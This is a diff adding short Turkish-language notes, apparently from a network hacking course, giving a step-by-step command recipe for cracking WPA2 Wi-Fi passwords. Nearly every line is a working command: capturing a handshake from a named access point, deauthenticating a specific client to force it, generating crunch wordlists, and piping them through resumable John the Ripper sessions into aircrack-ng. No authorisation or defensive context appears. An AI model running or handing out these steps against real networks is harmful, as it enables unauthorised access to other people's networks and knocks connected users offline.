@@ -1,0 +1,38 @@
+	ADVANCED NETWORK ATTAKCS
+
+	Hack WPA2
+airmon-ng start wlan0
+airodump-ng wlan0mon
+airodump-ng --bssid 74:9D:79:A6:A0:84 --channel 9 --write handshaketest wlan0mon
+aireplay-ng --deauth 10 -a 74:9D:79:A6:A0:84 -c E0:12:83:10:32:F2 wlan0mon
+crunch 8 9 beste -o wordlist
+aircrack-ng handshaketest-01.cap -w wordlist
+
+
+
+
+	JOHN
+ Aircrack-ng için kullanacağımız wordlisti durdurup devam ettirme işlemini sağlar.
+crunch 8 9 abhxy12 -o wordlist
+john --wordlist=wordlist --stdout --session=turgay | aircrack-ng -w - -b 74:9D:79:A6:A0:84 handshaketest-01.cap
+ Hacking işlemimiz başladı. JOHN'dan çıkmak için "q" tuşunu kullanmamız gerekiyor.
+john --restore=turgay | aircrack-ng -w - -b 74:9D:79:A6:A0:84 handshaketest-01.cap
+	-> turgay restore edildi ve kaldığımız yerden devam etmemizi sağladı.
+
+
+
+
+	BIG WORDLISTS
+ Cihaza hiçbir şekilde kaydetmeden çok büyük wordlistler ile çalışmak mümkün.
+crunch 8 8 | aircrack-ng -w - -b 74:9D:79:A6:A0:84 handshaketest-01.cap
+ output vermediğimiz için hiçbir yere kaydetmeden direkt olarak okutmaya başlayacaktır.
+
+
+
+
+	COMBINE EVERYTHING
+ Crunch'dan aldığımızı John'a, John'dan aldığımızı aircrack-ng'ye Yönlendireceğiz.
+crunch 8 8 | john --stdin --session=bturgay --stdout | aircrack-ng -w - -b 74:9D:79:A6:A0:84 handshaketest-01.cap
+ Durdurmak için "q" tuşunu kullanmak veya CTRL + C yapmak yeterli olacaktır.
+crunch 8 8 | john --restore=bturgay | aircrack-ng -w - -b 74:9D:79:A6:A0:84 handshaketest-01.cap
+ Böylelikle hem çok büyük bir wordlist ile çalışmış hem de durdurup devam ettirmiş olduk.
